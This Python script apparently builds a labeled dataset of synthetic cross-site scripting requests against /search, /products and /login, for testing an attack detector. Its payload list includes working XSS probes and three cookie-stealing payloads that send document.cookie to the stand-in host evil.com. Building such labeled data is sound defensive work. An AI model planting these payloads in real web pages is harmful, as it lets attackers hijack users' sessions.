"""XSS Attack Traffic Generator.

Generates labeled XSS attack requests for testing.
"""

import json
import uuid
import time
from datetime import datetime
from pathlib import Path


XSS_PAYLOADS = {
    "reflected": [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert('hello')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "stored": [
        "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
        "<img src=x onerror='new Image().src=\"http://evil.com/\"+document.cookie'>",
        "<svg/onload='fetch(\"http://evil.com/\"+document.cookie)'>",
    ],
    "dom_based": [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:void(document.cookie)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "encoded": [
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<scr\\u006ipt>alert(1)</scr\\u006ipt>",
    ],
    "event_handlers": [
        "<div onmouseover=alert(1)>hover</div>",
        "<input onblur=alert(1) autofocus><input autofocus>",
        "<textarea onfocus=alert(1) autofocus></textarea>",
        "<select autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
    ],
}

TARGET_ENDPOINTS = ["/search", "/products", "/login"]


def generate_xss_requests(num_requests: int = 100) -> list[dict]:
    """Generate XSS attack requests."""
    requests = []
    timestamp = time.time()
    techniques = list(XSS_PAYLOADS.keys())

    for i in range(num_requests):
        technique = techniques[i % len(techniques)]
        payload = XSS_PAYLOADS[technique][i % len(XSS_PAYLOADS[technique])]
        endpoint = TARGET_ENDPOINTS[i % len(TARGET_ENDPOINTS)]

        if endpoint == "/login":
            path = "/login"
            query_string = ""
            body_fields = ["username", "password"]
            body = f"username={payload}&password=test"
            method = "POST"
        else:
            path = endpoint
            query_string = f"q={payload}"
            body_fields = []
            body = ""
            method = "GET"

        requests.append({
            "request_id": f"REQ-XSS-{uuid.uuid4().hex[:8].upper()}",
            "timestamp": datetime.fromtimestamp(timestamp).isoformat(),
            "method": method,
            "path": path,
            "query_string": query_string,
            "query": {"q": payload} if query_string else {},
            "headers": {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "content-type": "application/x-www-form-urlencoded" if body else "",
            },
            "body_fields": body_fields,
            "body_size": len(body.encode()) if body else 0,
            "session_id": f"S-ATTACK-{uuid.uuid4().hex[:6].upper()}",
            "source_id": f"ATTACKER-{uuid.uuid4().hex[:4].upper()}",
            "content_type": "application/x-www-form-urlencoded" if body else "",
            "label": "ATTACK",
            "attack_type": "XSS",
            "technique": technique,
            "payload": payload,
        })

        timestamp += 0.1

    return requests


def save_dataset(requests: list[dict], filepath: str):
    """Save attack requests to JSONL."""
    Path(filepath).parent.mkdir(parents=True, exist_ok=True)
    with open(filepath, "w") as f:
        for req in requests:
            f.write(json.dumps(req) + "\n")
    print(f"Saved {len(requests)} XSS requests to {filepath}")


if __name__ == "__main__":
    requests = generate_xss_requests(100)
    save_dataset(requests, "data/raw/attacks/xss.jsonl")
